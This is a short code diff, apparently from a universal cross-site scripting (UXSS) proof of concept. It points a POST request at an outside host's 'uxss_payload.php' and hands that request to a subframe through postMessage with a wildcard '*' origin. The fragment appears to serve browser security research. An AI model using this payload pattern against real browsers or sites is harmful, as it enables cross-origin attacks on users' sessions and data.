@@ -20,7 +20,7 @@
             Data: {}
         }
         data.Method = "POST";
-        data.URL = "https://case.neargle.com";
+        data.URL = "https://case.neargle.com/payload/uxss_payload.php";
         data.SetBodyText = true;
         data.post = {};
         setTimeout('subframe.postMessage(data, "*")', 2000);
